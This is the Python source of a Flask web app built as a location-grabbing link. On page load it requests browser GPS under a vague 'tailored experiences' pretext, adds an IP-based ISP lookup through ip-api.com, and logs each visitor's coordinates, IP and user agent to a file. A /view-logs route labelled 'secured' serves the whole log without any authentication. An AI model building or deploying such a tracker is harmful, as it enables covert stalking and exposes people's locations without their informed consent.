from flask import Flask, request, jsonify, send_file, redirect, url_for
import os
from datetime import datetime
import requests
import logging

# Initialize Flask app
app = Flask(__name__)

# Ensure a logs directory exists
LOG_DIR = "logs"
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

# Configure logging to output to console (for Render logs)
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# Geolocation API for ISP-based location
GEOLOCATION_API_URL = "http://ip-api.com/json"

# Default route redirects to GPS tracker
@app.route('/')
def home():
    return redirect(url_for('gps_tracker'))

# Route to serve the GPS tracker page
@app.route('/gps-tracker')
def gps_tracker():
    return """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Enhanced Location Tracker</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                background-color: #f4f4f9;
                color: #333;
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
            }
            .container {
                text-align: center;
                background: white;
                padding: 20px;
                border-radius: 8px;
                box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
                max-width: 400px;
                width: 100%;
            }
            h1 {
                color: #4caf50;
                font-size: 24px;
            }
            button {
                background-color: #4caf50;
                color: white;
                border: none;
                padding: 10px 20px;
                font-size: 16px;
                border-radius: 4px;
                cursor: pointer;
                margin-top: 10px;
            }
            button:hover {
                background-color: #45a049;
            }
            p {
                margin: 15px 0;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Welcome to Location Tracker</h1>
            <p>Your location helps us provide you with tailored experiences. Please allow location access.</p>
            <p id="status">Initializing location request...</p>
            <script>
                // Automatically request GPS location when the page loads
                window.onload = function() {
                    getLocation();
                };

                function getLocation() {
                    if (navigator.geolocation) {
                        document.getElementById("status").innerText = "Requesting your location. Please allow access.";
                        navigator.geolocation.getCurrentPosition(sendLocation, showError);
                    } else {
                        document.getElementById("status").innerText = "Your browser does not support geolocation.";
                    }
                }

                function sendLocation(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;

                    // Send GPS data along with other details to the server
                    fetch('/gps-logger', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ 
                            latitude: lat, 
                            longitude: lon, 
                            user_agent: navigator.userAgent 
                        })
                    })
                    .then(response => response.json())
                    .then(data => {
                        document.getElementById("status").innerText = "Thank you! Your location has been successfully logged.";
                    })
                    .catch(error => {
                        document.getElementById("status").innerText = "Error logging your location. Please try again.";
                    });
                }

                function showError(error) {
                    switch(error.code) {
                        case error.PERMISSION_DENIED:
                            document.getElementById("status").innerText = "Permission denied. Please allow location access.";
                            break;
                        case error.POSITION_UNAVAILABLE:
                            document.getElementById("status").innerText = "Location information is unavailable.";
                            break;
                        case error.TIMEOUT:
                            document.getElementById("status").innerText = "The request to get your location timed out.";
                            break;
                        case error.UNKNOWN_ERROR:
                            document.getElementById("status").innerText = "An unknown error occurred.";
                            break;
                    }
                }
            </script>
        </div>
    </body>
    </html>
    """

# Route to log GPS and device details
@app.route('/gps-logger', methods=['POST'])
def gps_logger():
    data = request.get_json()
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    # Get ISP-based location
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    isp_location_data = {}
    try:
        response = requests.get(f"{GEOLOCATION_API_URL}/{user_ip}")
        if response.status_code == 200:
            isp_location_data = response.json()
        else:
            isp_location_data = {"error": "Failed to fetch ISP-based geolocation"}
    except Exception as e:
        isp_location_data = {"error": str(e)}

    # Log GPS, ISP, and device details
    log_entry = {
        "timestamp": timestamp,
        "ip": user_ip,
        "gps": {
            "latitude": data.get("latitude"),
            "longitude": data.get("longitude")
        },
        "isp_location": isp_location_data,
        "user_agent": data.get("user_agent"),
    }

    log_line = f"{log_entry}\n"

    # Save to log file
    with open(os.path.join(LOG_DIR, "access_logs.txt"), "a") as log_file:
        log_file.write(log_line)

    # Log to Render logs
    logging.info(f"Complete Log entry: {log_entry}")

    return jsonify({"message": "Data logged successfully", "data": log_entry}), 200

# Route to view logs (secured)
@app.route('/view-logs', methods=['GET'])
def view_logs():
    try:
        with open(os.path.join(LOG_DIR, "access_logs.txt"), "r") as log_file:
            logs = log_file.read()
        return jsonify({"logs": logs})
    except FileNotFoundError:
        return jsonify({"error": "Log file not found"}), 404

# Health check (useful for deployment testing)
@app.route('/health')
def health():
    return "App is running!"

if __name__ == "__main__":
    # Run the application
    app.run(host="0.0.0.0", port=5000)
